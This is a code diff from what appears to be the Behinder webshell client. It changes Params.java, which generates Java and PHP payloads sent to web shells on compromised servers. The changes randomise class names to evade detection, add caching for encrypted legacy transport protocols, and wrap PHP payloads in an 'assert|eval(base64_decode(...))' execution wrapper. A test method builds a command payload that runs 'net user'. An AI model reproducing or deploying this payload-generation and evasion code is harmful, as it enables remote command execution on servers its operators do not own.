@@ -3,13 +3,13 @@ package net.rebeyond.behinder.core;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
-import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import javassist.ByteArrayClassPath;
@@ -33,6 +33,7 @@ import org.objectweb.asm.MethodVisitor;
 public class Params {
    private static Object t = new Object();
    public static Map payloadClassCache = new HashMap();
+   public static Map legacyPayloadClassCache = new HashMap();
 
    public static byte[] getParamedClass(String clsName, final Map params) throws Exception {
       ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", clsName));
@@ -51,7 +52,7 @@ public class Params {
       byte[] result = cw.toByteArray();
       String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
       if (!clsName.equals("LoadNativeLibrary")) {
-         String newClassName = getRandomClassName(oldClassName);
+         String newClassName = Utils.getRandomClassName(oldClassName);
          result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
          result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
       }
@@ -94,9 +95,49 @@ public class Params {
       mv.visitFieldInsn(179, className, paramName, "Ljava/lang/String;");
    }
 
+   public static byte[] getParamedClass(byte[] classBytes, final Map params, String newClassName) throws Exception {
+      ClassReader classReader = new ClassReader(classBytes);
+      final String clsName = classReader.getClassName();
+      ClassWriter cw = new ClassWriter(1);
+      classReader.accept(new ClassAdapter(cw) {
+         public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
+            if (name.equals("<clinit>")) {
+               int blockSize = '\ufffa';
+               MethodVisitor mv = this.cv.visitMethod(access, name, desc, signature, exceptions);
+
+               String paramName;
+               String[] values;
+               for(Iterator var8 = params.keySet().iterator(); var8.hasNext(); Params.setJavaParam(clsName, mv, paramName, values)) {
+                  paramName = (String)var8.next();
+                  String paramValue = (String)params.get(paramName);
+                  values = null;
+                  if (paramValue.length() > blockSize) {
+                     values = Utils.splitString(paramValue, blockSize);
+                  } else {
+                     values = new String[]{paramValue};
+                  }
+               }
+
+               mv.visitEnd();
+               return mv;
+            } else {
+               return this.cv.visitMethod(access, name, desc, signature, exceptions);
+            }
+         }
+      }, 0);
+      byte[] result = cw.toByteArray();
+      if (!clsName.equals("LoadNativeLibrary")) {
+         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(clsName.length() + 2), 76}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
+         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)clsName.length()}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
+      }
+
+      result[7] = 50;
+      return result;
+   }
+
    public static byte[] getParamedClass(final String clsName, byte[] classBytes, final Map params) throws Exception {
       String opcodeClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
-      String newClassName = getRandomClassName(opcodeClassName);
+      String newClassName = Utils.getRandomClassName(opcodeClassName);
       ClassReader classReader = new ClassReader(classBytes);
       ClassWriter cw = new ClassWriter(1);
       classReader.accept(new ClassAdapter(cw) {
@@ -139,9 +180,28 @@ public class Params {
    }
 
    public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception {
-      int transProtocolId = transProtocol.getId();
-      if (payloadClassCache.containsKey(transProtocolId) && ((Map)payloadClassCache.get(transProtocolId)).containsKey(className)) {
-         return ((CtClass)((Map)payloadClassCache.get(transProtocolId)).get(className)).toBytecode();
+      String transProtocolName = transProtocol.getName();
+      if (transProtocol.getId() < 0) {
+         String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();
+         if (legacyPayloadClassCache.containsKey(transProtocolName) && ((Map)legacyPayloadClassCache.get(transProtocolName)).containsKey(key) && ((Map)((Map)legacyPayloadClassCache.get(transProtocolName)).get(key)).containsKey(className)) {
+            return ((CtClass)((Map)((Map)legacyPayloadClassCache.get(transProtocolName)).get(key)).get(className)).toBytecode();
+         } else {
+            ClassPool cp = ClassPool.getDefault();
+            CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));
+            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);
+            PocCls.removeMethod(PocCls.getDeclaredMethod("Encrypt"));
+            PocCls.addMethod(encodeMethod);
+            PocCls.setName(className);
+            PocCls.detach();
+            Map payloadClass = new HashMap();
+            payloadClass.put(className, PocCls);
+            Map keyPayloadMap = new HashMap();
+            keyPayloadMap.put(key, payloadClass);
+            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);
+            return PocCls.toBytecode();
+         }
+      } else if (payloadClassCache.containsKey(transProtocolName) && ((Map)payloadClassCache.get(transProtocolName)).containsKey(className)) {
+         return ((CtClass)((Map)payloadClassCache.get(transProtocolName)).get(className)).toBytecode();
       } else {
          ClassPool cp = ClassPool.getDefault();
          CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));
@@ -152,7 +212,7 @@ public class Params {
          PocCls.detach();
          Map payloadClass = new HashMap();
          payloadClass.put(className, PocCls);
-         payloadClassCache.put(transProtocolId, payloadClass);
+         payloadClassCache.put(transProtocolName, payloadClass);
          return PocCls.toBytecode();
       }
    }
@@ -276,42 +336,11 @@ public class Params {
       p.put("cmd", "net user");
       TransProtocolDao transProtocolDao = new TransProtocolDao();
       TransProtocol transProtocol = transProtocolDao.findTransProtocolById(3);
-      byte[] data = getParamedClass("net.rebeyond.behinder.payload.java.Cmd", (Map)p, (TransProtocol)transProtocol);
+      byte[] data = getParamedClass((String)"net.rebeyond.behinder.payload.java.Cmd", (Map)p, (TransProtocol)transProtocol);
       FileOutputStream fos = new FileOutputStream("d:/cmd.class");
       fos.write(data);
       fos.flush();
       fos.close();
-   }
-
-   private static String getRandomClassName(String sourceName) {
-      String[] domainAs = new String[]{"com", "net", "org", "sun"};
-      String domainB = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
-      String domainC = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
-      String domainD = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
-      String className = Utils.getRandomAlpha((new Random()).nextInt(7) + 4);
-      className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
-      int domainAIndex = (new Random()).nextInt(4);
-      String domainA = domainAs[domainAIndex];
-      int randomSegments = (new Random()).nextInt(3) + 3;
-      String randomName;
-      switch(randomSegments) {
-      case 3:
-         randomName = domainA + "/" + domainB + "/" + className;
-         break;
-      case 4:
-         randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
-         break;
-      case 5:
-         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
-         break;
-      default:
-         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
-      }
-
-      while(randomName.length() > sourceName.length()) {
-      }
-
-      return randomName;
    }
 
    public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
@@ -413,7 +442,7 @@ public class Params {
 
          byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
          byte[] replacement = Utils.ascii2unicode(paraValue, 1);
-         ReplacingInputStream ris = new ReplacingInputStream(bis, search, replacement);
+         InputStream ris = new ReplacingInputStream(bis, search, replacement);
 
          int b;
          while(-1 != (b = ris.read())) {
@@ -458,7 +487,7 @@ public class Params {
 
       paraList = paraList.replaceFirst(",", "");
       code.append("\r\nmain(" + paraList + ");");
-      return code.toString().getBytes();
+      return ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(code.toString().getBytes()) + "'));").getBytes();
    }
 
    public static List getPhpParams(String phpPayload) {
